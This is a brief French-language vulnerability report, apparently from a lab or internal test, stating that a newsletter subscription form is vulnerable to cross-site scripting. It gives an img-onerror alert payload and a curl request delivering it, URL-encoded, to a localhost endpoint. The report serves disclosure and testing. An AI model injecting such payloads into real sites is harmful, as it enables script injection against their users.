# XSS (again..)

Le formulaire de souscription de la newsletter est vulnerable aux XSS

```
<img src=x onerror=alert(1)>
```

```shell
curl -s 'http://localhost:4942/newsletter?email=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E&msg=subscribed'
```
